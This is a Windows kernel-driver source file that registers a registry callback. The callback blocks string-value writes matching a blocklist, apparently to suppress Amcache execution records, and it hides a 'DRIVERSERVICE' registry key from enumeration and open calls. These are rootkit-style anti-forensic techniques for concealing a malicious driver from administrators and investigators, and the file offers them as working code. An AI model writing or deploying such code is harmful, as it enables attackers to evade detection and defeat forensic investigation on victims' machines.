#include "Amcache.h"
#include "Blocklist.h"

LARGE_INTEGER g_RegCookie;

static BOOLEAN CaseInsensitiveWCompare(PCWSTR s1, PCWSTR s2, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) {
        wchar_t c1 = s1[i], c2 = s2[i];
        if (c1 >= L'A' && c1 <= L'Z') c1 += 32;
        if (c2 >= L'A' && c2 <= L'Z') c2 += 32;
        if (c1 != c2) return FALSE;
    }
    return TRUE;
}

NTSTATUS RegistryCallback(
    PVOID CallbackContext,
    PVOID Argument1,
    PVOID Argument2)
{
    UNREFERENCED_PARAMETER(CallbackContext);
    REG_NOTIFY_CLASS notifyClass = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;

    if (notifyClass == RegNtPreSetValueKey) {
        PREG_SET_VALUE_KEY_INFORMATION preSetInfo = (PREG_SET_VALUE_KEY_INFORMATION)Argument2;
        
        if (preSetInfo->Type == REG_SZ || preSetInfo->Type == REG_EXPAND_SZ) {
            if (preSetInfo->Data && preSetInfo->DataSize > 0) {
                UNICODE_STRING valData;
                valData.Buffer = (PWCH)preSetInfo->Data;
                valData.Length = (USHORT)preSetInfo->DataSize;
                valData.MaximumLength = (USHORT)preSetInfo->DataSize;
                
                if (ShouldFilterName(&valData)) {
                    return STATUS_ACCESS_DENIED;
                }
            }
        }
    } else if (notifyClass == RegNtPostEnumerateKey) {
        PREG_POST_OPERATION_INFORMATION postInfo = (PREG_POST_OPERATION_INFORMATION)Argument2;
        if (NT_SUCCESS(postInfo->Status)) {
            PREG_ENUMERATE_KEY_INFORMATION postEnum = (PREG_ENUMERATE_KEY_INFORMATION)postInfo->PreInformation;
            if (postEnum->KeyInformationClass == KeyBasicInformation || 
                postEnum->KeyInformationClass == KeyNodeInformation) 
            {
                PKEY_BASIC_INFORMATION info = (PKEY_BASIC_INFORMATION)postEnum->KeyInformation;
                if (info && info->NameLength > 0) {
                    if (info->NameLength >= 18) { 
                        if (CaseInsensitiveWCompare(info->Name, L"DRIVERSERVICE", 9)) {
                            postInfo->ReturnStatus = STATUS_NO_MORE_ENTRIES;
                             return STATUS_CALLBACK_BYPASS;
                        }
                    }
                }
            }
        }
    } else if (notifyClass == RegNtPreOpenKey || notifyClass == RegNtPreOpenKeyEx) {
        PREG_PRE_OPEN_KEY_INFORMATION preOpen = (PREG_PRE_OPEN_KEY_INFORMATION)Argument2;
        if (preOpen->CompleteName && preOpen->CompleteName->Length > 0) {
            if (preOpen->CompleteName->Length >= 18) {
                
                USHORT chars = preOpen->CompleteName->Length / 2;
                if (chars >= 9) {
                    if (CaseInsensitiveWCompare(&preOpen->CompleteName->Buffer[chars - 9], L"DRIVERSERVICE", 9)) {
                        return STATUS_OBJECT_NAME_NOT_FOUND;
                    }
                }
            }
        }
    }
    return STATUS_SUCCESS;
}

NTSTATUS RegisterAmcachePrevention(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING altitude;
    RtlInitUnicodeString(&altitude, L"388800");
    return CmRegisterCallbackEx(RegistryCallback, &altitude, DriverObject, NULL, &g_RegCookie, NULL);
}

VOID UnregisterAmcachePrevention()
{
    if (g_RegCookie.QuadPart != 0) {
        CmUnRegisterCallback(g_RegCookie);
        g_RegCookie.QuadPart = 0;
    }
}
